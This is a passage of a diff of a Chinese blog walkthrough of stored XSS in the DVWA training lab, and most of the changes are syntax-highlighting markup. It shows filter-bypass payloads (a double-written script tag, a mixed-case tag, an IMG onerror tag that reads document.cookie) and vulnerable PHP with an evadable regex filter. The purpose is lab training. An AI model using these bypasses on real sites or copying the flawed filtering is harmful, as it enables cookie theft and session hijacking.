-<div class="hljs"><pre><code class="hljs xml">使用双写绕过，输入  &lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
-使用大小写绕过，输入<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
+<div class="hljs"><pre><code class="hljs xml">使用双写绕过，输入  &lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
+使用大小写绕过，输入<span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> 
 输入其他标签，如  <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/05/CIUt6lTadZ5fEig.png" srcset="/img/loading.gif" alt="xssstored2.png"></p>
 <h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
     <span class="hljs-comment">// Get input</span>
-    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
-    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
+    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
 
     <span class="hljs-comment">// Sanitize message input</span>
-    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
-    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
-    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
+    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );
 
     <span class="hljs-comment">// Sanitize name input</span>
-    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
-    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
+    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
 
     <span class="hljs-comment">// Update database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
 
     <span class="hljs-comment">//mysql_close();</span>
 &#125;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
-<span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );
-<span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre></div>
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
+<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );
+<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre></div>
 
-<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
-<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
-<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
-<p>name,执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
+<p> <code>strip_tags() </code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
+<p> <code>addslashes() </code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
+<p> <code>htmlspecialchars() </code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
+<p>name,执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code> /i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt; </code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
 <p>只能换一个标签</p>
 <div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>
 
